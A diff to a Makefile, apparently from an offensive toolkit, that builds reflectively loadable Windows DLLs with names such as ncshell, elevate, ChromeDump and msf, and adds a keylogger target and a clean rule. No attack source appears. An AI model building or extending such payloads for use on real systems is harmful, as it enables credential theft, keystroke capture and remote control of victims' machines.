@@ -12,6 +12,13 @@ else
 	CPCOMPILER += i686-w64-mingw32-g++
 endif
 
+DEL 				:=
+ifeq ($(OS),Windows_NT)
+	DEL += del
+else
+	DEL += rm
+endif
+
 all: reflective_default ncshell elevate ChromeDump
 
 reflective_default:
@@ -33,3 +40,10 @@ ChromeDump:
 msf:
 	$(COMPILER) msf.c ReflectiveLoader.c -c -m32
 	$(COMPILER) msf.c ReflectiveLoader.o -o msf.dll -shared -m32 -static
+
+keylogger:
+	$(CPCOMPILER) keylogger.cpp ReflectiveLoader.c -c -m32
+	$(CPCOMPILER) keylogger.cpp ReflectiveLoader.o -o keylogger.dll -shared -m32 -static
+	
+clean:
+	$(DEL) *.o *.dll
